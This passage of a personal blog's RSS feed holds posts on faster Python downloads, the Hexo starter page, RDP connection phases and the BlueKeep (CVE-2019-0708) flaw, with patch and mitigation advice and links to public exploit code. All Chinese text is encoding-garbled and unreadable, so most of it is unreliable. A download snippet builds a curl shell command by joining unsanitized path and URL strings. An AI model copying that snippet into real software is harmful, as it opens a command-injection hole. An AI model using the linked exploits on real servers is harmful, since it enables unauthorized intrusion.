      <content:encoded><![CDATA[<h2 id="urllibçš„urlretrieveæ–¹æ³•ä¸‹è½½å¤ªæ…¢çš„è§£å†³æ–¹æ³•"><a href="#urllibçš„urlretrieveæ–¹æ³•ä¸‹è½½å¤ªæ…¢çš„è§£å†³æ–¹æ³•" class="headerlink" title="urllibçš„urlretrieveæ–¹æ³•ä¸‹è½½å¤ªæ…¢çš„è§£å†³æ–¹æ³•"></a>urllibçš„urlretrieveæ–¹æ³•ä¸‹è½½å¤ªæ…¢çš„è§£å†³æ–¹æ³•</h2><p>ä»Šå¤©å°è¯•é€‚åº”pythonçš„urllibä¸‹è½½æ–‡ä»¶ï¼Œç»“æœå‘ç°ä¸‰çº¿ç¨‹å±…ç„¶æ€»ä¸‹è½½é€Ÿåº¦åªæœ‰500kb/sï¼Œä½¿ç”¨CMDçš„curlå‘½ä»¤ä¸‹è½½é€Ÿåº¦æ˜¯è¿™ä¸ªçš„å‡ å€ï¼Œå› æ­¤ç»è¿‡æˆ‘çš„å®éªŒå’ŒæŸ¥è¯ï¼Œå¯ä»¥ä½¿ç”¨urlopençš„æ–¹æ³•æ¥æ›¿ä»£</p><pre><code class="python">resp = urllib.urlopen(URL)respHtml = resp.read()binfile = open(DownloadFilePath, &quot;wb&quot;)binfile.write(respHtml)binfile.close()</code></pre><p>ç›´æ¥è·å–æ•°æ®ï¼ŒäºŒè¿›åˆ¶ä¿å­˜åˆ°æ–‡ä»¶ï¼Œè¿™æ ·æ¯”ç›´æ¥ä½¿ç”¨urlretrieveå¿«è®¸å¤šã€‚<br>æˆ–è€…ç›´æ¥ä½¿ç”¨curlå‘½ä»¤</p><pre><code class="python">import osos.system(&#39;curl -o &#39; + DownloadFilePath + &#39; &#39; + URL)</code></pre>]]></content:encoded>
      
      <comments>http://romanarcher.github.io/post/b1acc7fd.html#disqus_thread</comments>
    </item>
    
    <item>
      <title>Hello World</title>
      <link>http://romanarcher.github.io/post/4a17b156.html</link>
      <guid>http://romanarcher.github.io/post/4a17b156.html</guid>
      <pubDate>Fri, 18 Oct 2019 07:26:13 GMT</pubDate>
      <description>
      
        
        
          &lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.
        
      
      </description>
      
      
      <content:encoded><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre><code class="bash">$ hexo new &quot;My New Post&quot;</code></pre><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre><code class="bash">$ hexo server</code></pre><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre><code class="bash">$ hexo generate</code></pre><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre><code class="bash">$ hexo deploy</code></pre><p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>]]></content:encoded>
      
      <comments>http://romanarcher.github.io/post/4a17b156.html#disqus_thread</comments>
    </item>
    
    <item>
      <title>RDPå»ºç«‹è¿‡ç¨‹</title>
      <link>http://romanarcher.github.io/post/1e6d0424.html</link>
      <guid>http://romanarcher.github.io/post/1e6d0424.html</guid>
      <pubDate>Fri, 18 Oct 2019 07:26:13 GMT</pubDate>
      <description>
      
        
        
          &lt;h2 id=&quot;RDPåè®®çš„å®˜æ–¹æ–‡æ¡£&quot;&gt;&lt;a href=&quot;#RDPåè®®çš„å®˜æ–¹æ–‡æ¡£&quot; class=&quot;headerlink&quot; title=&quot;RDPåè®®çš„å®˜æ–¹æ–‡æ¡£&quot;&gt;&lt;/a&gt;RDPåè®®çš„å®˜æ–¹æ–‡æ¡£&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://docs.microsoft.com/en
        
      
      </description>
      
      
      <content:encoded><![CDATA[<h2 id="RDPåè®®çš„å®˜æ–¹æ–‡æ¡£"><a href="#RDPåè®®çš„å®˜æ–¹æ–‡æ¡£" class="headerlink" title="RDPåè®®çš„å®˜æ–¹æ–‡æ¡£"></a>RDPåè®®çš„å®˜æ–¹æ–‡æ¡£</h2><p><a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rdpbcgr/5073f4ed-1e93-45e1-b039-6e30c385867c" target="_blank" rel="noopener">[MS-RDPBCGR]: Remote Desktop Protocol: Basic Connectivity and Graphics Remoting</a></p><p>æ¥ä¸‹æ¥çš„å†…å®¹éƒ½æ˜¯åŸºäºæ­¤åè®®</p><h2 id="RDPæ—¶åºå›¾"><a href="#RDPæ—¶åºå›¾" class="headerlink" title="RDPæ—¶åºå›¾"></a>RDPæ—¶åºå›¾</h2><hr><p><img src="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rdpbcgr/ms-rdpbcgr_files/image001.png" alt="RDPæ—¶åºå›¾"></p><h2 id="è¿æ¥çš„åä¸ªé˜¶æ®µ"><a href="#è¿æ¥çš„åä¸ªé˜¶æ®µ" class="headerlink" title="è¿æ¥çš„åä¸ªé˜¶æ®µ"></a>è¿æ¥çš„åä¸ªé˜¶æ®µ</h2><hr><h3 id="1-Connection-Initiation"><a href="#1-Connection-Initiation" class="headerlink" title="1.Connection Initiation"></a>1.Connection Initiation</h3><p>å®¢æˆ·æœºå‘æœåŠ¡å‘é€ç­‰çº§0çš„x.224çš„è¿æ¥è¯·æ±‚ï¼ŒæœåŠ¡å™¨å›åº”ã€‚æ­¤åå®¢æˆ·æœºå’ŒæœåŠ¡å™¨çš„æ‰€æœ‰æ•°æ®éƒ½è¦åŒ…è£…åœ¨x.224çš„PDUé‡Œé¢</p><h3 id="2-Basic-Settings-Exchange"><a href="#2-Basic-Settings-Exchange" class="headerlink" title="2.Basic Settings Exchange"></a>2.Basic Settings Exchange</h3><p>è¿™ä¸ªé˜¶æ®µå®¢æˆ·æœºä¸æœåŠ¡å™¨è¿›è¡ŒåŸºç¡€è®¾ç½®çš„äº¤æ¢ï¼ˆæ¯”å¦‚æ ¸å¿ƒæ•°æ®ã€å®‰å…¨æ•°æ®ã€ç½‘ç»œæ•°æ®åº“ï¼‰ï¼Œå®¢æˆ·æœºå‘é€MCSè¿æ¥åˆå§‹åŒ–PDUï¼ŒæœåŠ¡å™¨è¿”å›MCSè¿æ¥å“åº”PDUã€‚è¿æ¥åˆå§‹åŒ–PDUå¸¦æœ‰é€šç”¨ä¼šè®®æ§åˆ¶ï¼ˆGeneric Conference Control ï¼ŒGCCï¼‰çš„ä¼šè®®åˆ›å»ºè¯·æ±‚ï¼Œè¿æ¥å›åº”PDUåˆ™å¸¦æœ‰GCCçš„ä¼šè®®åˆ›å»ºå›åº”ã€‚</p><p><img src="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rdpbcgr/ms-rdpbcgr_files/image002.png" alt="MCSè¿æ¥åˆå§‹åŒ–"></p><p><img src="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rdpbcgr/ms-rdpbcgr_files/image003.png" alt="MCSè¿æ¥å›åº”"></p><h3 id="3-Channel-Connection"><a href="#3-Channel-Connection" class="headerlink" title="3.Channel Connection"></a>3.Channel Connection</h3><p>å®¢æˆ·æœºå…ˆå‘é€MCSå»ºç«‹åŸŸè¯·æ±‚PDUå†å‘é€MCSé™„åŠ åˆ°ç”¨æˆ·è¯·æ±‚PDUï¼Œä»¥æ­¤è®²ä¸»ç”¨æˆ·æ ‡è¯†é™„åŠ åˆ°MCSåŸŸã€‚æœåŠ¡å™¨æ”¶åˆ°åä¼šå›å¤MCSé™„åŠ ç”¨æˆ·PDUï¼Œå…¶ä¸­åŒ…å«ç€ç”¨æˆ·é€šé“IDã€‚</p><p>ç„¶åï¼Œå®¢æˆ·ç«¯é€šè¿‡ä½¿ç”¨å¤šä¸ªMCSé€šé“è¿æ¥è¯·æ±‚PDUè¿æ¥ç”¨æˆ·é€šé“ã€è¾“å…¥/è¾“å‡º(I/O)é€šé“å’Œæ‰€æœ‰é™æ€è™šæ‹Ÿé€šé“(I/Oå’Œé™æ€è™šæ‹Ÿé€šé“idæ¥è‡ªåµŒå…¥åœ¨GCCåŒ…ä¸­çš„æ•°æ®)ã€‚</p><p>æœåŠ¡ç«¯ä¼šå¯¹æ¯ä¸€ä¸ªé€šé“è¿æ¥è¯·æ±‚å‘é€ä¸€ä¸ªMCSé€šé“è¿æ¥ç¡®è®¤PDUã€‚ï¼ˆRDP 4.0, 5.0, 5.1, 5.2, 6.0, 6.1, 7.0, 7.1, 8.0, 10.2, 10.3, 10.4, 10.5åªèƒ½åœ¨æ”¶åˆ°ä¸Šä¸€ä¸ªé€šé“è¿æ¥çš„ç¡®è®¤åæ‰èƒ½å‘ä¸‹ä¸€ä¸ªï¼ŒRDP 8.1, 10.0, 10.1å¯ä»¥ä¸€æ¬¡æ€§å…¨éƒ¨å‘é€è¿æ¥è¯·æ±‚ï¼‰</p><p>ä»è¿™ä¹‹åå®¢æˆ·æœºå‘é€çš„æ•°æ®éƒ½è¦åŒ…è£…åœ¨MCSå‘é€æ•°æ®è¯·æ±‚PDUä¸­ï¼ŒæœåŠ¡å™¨è¿”å›çš„æ•°æ®éƒ½è¦åŒ…è£…åœ¨MCSå‘é€æ•°æ®æŒ‡ç¤ºPDUä¸­ã€‚</p><h3 id="4-RDP-Security-Commencement"><a href="#4-RDP-Security-Commencement" class="headerlink" title="4.RDP Security Commencement"></a>4.RDP Security Commencement</h3><p>å¦‚æœä½¿ç”¨äº†æ ‡å‡†RDPå®‰å…¨æœºåˆ¶ï¼Œå¹¶ä¸”åŠ å¯†ç”Ÿæ•ˆçš„æƒ…å†µä¸‹ï¼ˆè¿™ä¸ªä½ å¯ä»¥é€šè¿‡æœåŠ¡å™¨åœ¨Basic Settings Exchangeé˜¶æ®µä¸­çš„è¿”å›æ•°æ®ä¸­çŸ¥é“ï¼‰ã€‚<br>å®¢æˆ·æœºéœ€è¦å‘æœåŠ¡å™¨å‘é€ä¸€ä¸ªåŒ…å«ç”±æœåŠ¡å™¨ç»™å‡ºçš„å…¬é’¥åŠ å¯†è¿‡çš„32å­—èŠ‚éšæœºæ•°çš„å®‰å…¨äº¤æ¢PDUã€‚ï¼ˆå…¬é’¥åœ¨Basic Settings Exchangeé˜¶æ®µä¸­çš„è¿”å›æ•°æ®ä¸­å¯ä»¥æ‰¾åˆ°ï¼‰<br>å®¢æˆ·æœºå’ŒæœåŠ¡å™¨å°†é€šè¿‡è¿™32å­—èŠ‚çš„éšæœºæ•°ç”Ÿæˆä¼šè¯å¯†é’¥ï¼Œä»¥åçš„PDUå°†ç”¨æ­¤æ¥è¿›è¡ŒåŠ å¯†å’ŒéªŒè¯å®Œæ•´æ€§ã€‚</p><p>ä»è¿™é‡Œå¼€å§‹åç»­çš„RDPæ•°æ®éƒ½å¯ä»¥åŠ å¯†</p><h3 id="5-Secure-Settings-Exchange"><a href="#5-Secure-Settings-Exchange" class="headerlink" title="5.Secure Settings Exchange"></a>5.Secure Settings Exchange</h3><p>ä¸€äº›æ•æ„Ÿæ•°æ®æ¯”å¦‚ï¼ˆç”¨æˆ·åï¼Œå¯†ç ï¼Œé‡æ–°è¿æ¥çš„cookieï¼‰å°†é€šè¿‡ç”¨æˆ·ä¿¡æ¯PDUå‘é€åˆ°æœåŠ¡å™¨ä¸Š</p><h3 id="6-Optional-Connect-Time-Auto-Detection"><a href="#6-Optional-Connect-Time-Auto-Detection" class="headerlink" title="6.Optional Connect-Time Auto-Detection"></a>6.Optional Connect-Time Auto-Detection</h3><p>å¯é€‰çš„æ£€æµ‹é˜¶æ®µï¼Œç”¨äºç¡®å®šåŒå‘é—´ç½‘ç»œçš„æ—¶å»¶å’Œå¸¦å®½ã€‚</p><h3 id="7-Licensing"><a href="#7-Licensing" class="headerlink" title="7.Licensing"></a>7.Licensing</h3><p>æœåŠ¡å™¨å‘å®¢æˆ·æœºä¼ è¾“è®¸å¯è¯ï¼Œå®¢æˆ·æœºä¿å­˜åï¼Œåœ¨éšåè¿æ¥ä¸­å°†è®¸å¯è¯å‘é€åˆ°æœåŠ¡å™¨æ¥éªŒè¯ï¼Œæœ¬æ–‡é»˜è®¤æœåŠ¡å™¨ä¸ä¼šå‘å®¢æˆ·æœºå‘é€è®¸å¯ã€‚</p><h3 id="8-Optional-Multitransport-Bootstrapping"><a href="#8-Optional-Multitransport-Bootstrapping" class="headerlink" title="8.Optional Multitransport Bootstrapping"></a>8.Optional Multitransport Bootstrapping</h3><p>æœåŠ¡å™¨å¯ä»¥é€‰æ‹©è¿›è¡Œå¤šé‡ä¼ è¾“è¿æ¥</p><h3 id="9-Capabilities-Exchange"><a href="#9-Capabilities-Exchange" class="headerlink" title="9.Capabilities Exchange"></a>9.Capabilities Exchange</h3><p>è¿™ä¸ªé˜¶æ®µæœåŠ¡å™¨ä¼šé€šè¿‡éœ€æ±‚æ´»åŠ¨PDUå‘é€è‡ªå·±æ”¯æŒçš„åŠŸèƒ½é›†ï¼Œéšåä¼šå‘é€ç›‘è§†å™¨å¸ƒå±€PDUï¼ˆå¯é€‰ï¼‰ã€‚å®¢æˆ·æœºéœ€è¦è¿”å›ç¡®è®¤æ´»åŠ¨PDU</p><h3 id="10-Connection-Finalization"><a href="#10-Connection-Finalization" class="headerlink" title="10.Connection Finalization"></a>10.Connection Finalization</h3><p>æœåŠ¡å™¨å’Œå®¢æˆ·æœºäº’ç›¸å‘é€æ•°æ®æ¥ç¡®å®šè¿æ¥çš„ç»†èŠ‚ï¼Œæ²¡æœ‰ä¸¥æ ¼è¦æ±‚ç›¸äº’é—´å¿…é¡»åŒæ­¥ï¼Œå‘é€çš„åŒ…æŒ‰é¡ºåºå‘é€å³å¯ï¼Œå³å®¢æˆ·æœºå’ŒæœåŠ¡ç«¯å¼‚æ­¥æŒ‰é¡ºåºå‘é€è¿æ¥çš„ä¿¡æ¯ã€‚</p><p>å®¢æˆ·æœºåœ¨é˜¶æ®µ9å‘é€äº†ç¡®è®¤æ´»åŠ¨PDUåå°±å¼€å§‹å‘é€é¼ æ ‡é”®ç›˜çš„è¾“å…¥ï¼ŒæœåŠ¡ç«¯åœ¨æ”¶åˆ°å­—ä½“åˆ—è¡¨çš„PDUåå°±å¯ä»¥å‘é€å›¾åƒè¾“å‡ºã€‚</p>]]></content:encoded>
      
      <comments>http://romanarcher.github.io/post/1e6d0424.html#disqus_thread</comments>
    </item>
    
    <item>
      <title>CVE-2019-0708</title>
      <link>http://romanarcher.github.io/post/24c02121.html</link>
      <guid>http://romanarcher.github.io/post/24c02121.html</guid>
      <pubDate>Fri, 18 Oct 2019 07:25:47 GMT</pubDate>
      <description>
      
        
        
          &lt;h2 id=&quot;CVE-2019-0708&quot;&gt;&lt;a href=&quot;#CVE-2019-0708&quot; class=&quot;headerlink&quot; title=&quot;CVE-2019-0708&quot;&gt;&lt;/a&gt;CVE-2019-0708&lt;/h2&gt;&lt;p&gt;CVE-2019-0708æ˜¯å¾®è½¯äº5æœˆ14æ—¥å…¬å¸ƒçš„ä¸€
        
      
      </description>
      
      
      <content:encoded><![CDATA[<h2 id="CVE-2019-0708"><a href="#CVE-2019-0708" class="headerlink" title="CVE-2019-0708"></a>CVE-2019-0708</h2><p>CVE-2019-0708æ˜¯å¾®è½¯äº5æœˆ14æ—¥å…¬å¸ƒçš„ä¸€ä¸ªè¿œç¨‹æ¡Œé¢æœåŠ¡çš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´(CVE-2019-0708)ï¼Œåˆ©ç”¨æ­¤æ¼æ´å¯ä»¥ç›´æ¥è·å–windowsæœåŠ¡å™¨çš„æƒé™ã€‚<br>ç°åœ¨ç½‘ä¸Šå·²ç»æœ‰å®‰å…¨ç ”ç©¶äººå‘˜æŠ«éœ²è¯¥æ¼æ´è¿œç¨‹crash PoCï¼Œå¯¹äºæŸäº›ç³»ç»Ÿå·²ç»èƒ½è·å–shellæ‰§è¡Œå‘½ä»¤äº†ã€‚</p><h2 id="å½±å“ç³»ç»Ÿ"><a href="#å½±å“ç³»ç»Ÿ" class="headerlink" title="å½±å“ç³»ç»Ÿ"></a>å½±å“ç³»ç»Ÿ</h2><ul><li>Windows 2003</li><li>Windows XP</li><li>Windows Vista</li><li>Windows 7</li><li>Windows Server 2008</li><li>Windows Server 2008 R2</li></ul><h2 id="é˜²èŒƒæ–¹æ³•"><a href="#é˜²èŒƒæ–¹æ³•" class="headerlink" title="é˜²èŒƒæ–¹æ³•"></a>é˜²èŒƒæ–¹æ³•</h2><h3 id="ä¸‹è½½ç›¸å…³è¡¥ä¸"><a href="#ä¸‹è½½ç›¸å…³è¡¥ä¸" class="headerlink" title="ä¸‹è½½ç›¸å…³è¡¥ä¸"></a>ä¸‹è½½ç›¸å…³è¡¥ä¸</h3><p><a href="https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-0708" target="_blank" rel="noopener">windows7å’Œwindows server 08è¡¥ä¸ä¸‹è½½</a><br><a href="https://support.microsoft.com/en-us/help/4500705/customer-guidance-for-cve-2019-0708" target="_blank" rel="noopener">windows xpå’Œwindows sever 03è¡¥ä¸ä¸‹è½½</a></p><h3 id="å¼€å¯NLP"><a href="#å¼€å¯NLP" class="headerlink" title="å¼€å¯NLP"></a>å¼€å¯NLP</h3><p>æ‰“å¼€ æ§åˆ¶é¢æ¿\æ‰€æœ‰æ§åˆ¶é¢æ¿é¡¹\ç³»ç»Ÿï¼Œç‚¹å¼€å³ä¾§çš„è¿œç¨‹è®¾ç½®ï¼Œåœ¨è¿œç¨‹æ¡Œé¢é¡¹ä¸­åˆ‡æ¢ä¸º </p><pre><code>ä»…å…è®¸è¿è¡Œä½¿ç”¨ç½‘ç»œçº§åˆ«èº«ä»½éªŒè¯çš„è¿œç¨‹æ¡Œé¢çš„è®¡ç®—æœºè¿æ¥ï¼ˆæ›´å®‰å…¨ï¼‰ï¼ˆNï¼‰</code></pre><p>ä¸€èˆ¬ä¸ºç¬¬ä¸‰é¡¹</p><h2 id="ç›¸å…³åˆ©ç”¨æ–¹æ³•"><a href="#ç›¸å…³åˆ©ç”¨æ–¹æ³•" class="headerlink" title="ç›¸å…³åˆ©ç”¨æ–¹æ³•"></a>ç›¸å…³åˆ©ç”¨æ–¹æ³•</h2><p><a href="https://github.com/rapid7/metasploit-framework/pull/12283" target="_blank" rel="noopener">cve-2019-0708çš„POCå’ŒEXP</a></p><ul><li>æ–°å¢<br><a href="https://github.com/coolboy4me/cve-2019-0708_bluekeep_rce" target="_blank" rel="noopener">xpçš„åˆ©ç”¨æ–¹æ³•</a></li></ul><h2 id="åè¨€"><a href="#åè¨€" class="headerlink" title="åè¨€"></a>åè¨€</h2><p>ä¸‹ç¯‡æ–‡ç« è®²è®²ä¸€ä¸‹rdpåè®®çš„ä¸€äº›çŸ¥è¯†<br><a href="https://doasromansdo.github.io/post/1e6d0424.html#more" target="_blank" rel="noopener">rpdçš„è¿æ¥è¿‡ç¨‹</a></p>]]></content:encoded>
      
      <comments>http://romanarcher.github.io/post/24c02121.html#disqus_thread</comments>
    </item>
    
  </channel>
</rss>
